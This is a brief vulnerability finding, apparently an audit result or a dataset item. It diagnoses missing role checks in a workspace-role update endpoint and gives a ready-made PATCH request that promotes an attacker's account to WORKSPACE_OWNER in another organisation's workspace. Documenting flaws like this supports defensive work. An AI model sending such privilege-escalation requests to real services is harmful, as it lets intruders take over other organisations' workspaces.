diagnosis: The endpoint checks JWT authentication via koaJwtCheck, but updates a user's role in a workspace without verifying that ctx.state.user is an OWNER or ADMIN of that workspaceId. Any member of any workspace can elevate themselves or other accounts to superadmin roles in other organizations.
exploit_request:
PATCH /workspaces/ws_fintech_771/members/usr_attacker_99/role HTTP/1.1
Host: app.collabsuite.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"newRole": "WORKSPACE_OWNER"}
